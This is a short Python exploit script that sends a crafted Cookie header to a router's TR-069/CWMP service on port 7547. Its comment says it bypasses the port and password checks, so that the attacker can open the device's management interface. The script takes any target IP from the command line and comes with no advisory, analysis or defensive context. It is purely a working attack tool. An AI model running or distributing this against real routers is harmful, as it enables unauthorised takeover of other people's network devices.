#!/usr/bin/env python
import sys
import requests
 
PORT="7547"
 
class exploit:
 
    def run(self, router_ip):
        #Bypass the CWMP port check. Bypass the password check
        headers = {"Cookie": "C88605=AAAAAAAA;C107257012=\x08\x0b\x27\x19\x66\x40\xb0\x21;C107257012=\x08\x0b\x27\x19"}  
 
        req = requests.get("http://" + router_ip +":" + PORT + "/",  headers = headers)
        if (req.status_code == 200):
            print("The exploit was sent successfully. Try accessing the management interface on port " + PORT)
 
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Please supply an ip address")
        exit()
 
    router_ip = sys.argv[1]
    exploit().run(router_ip)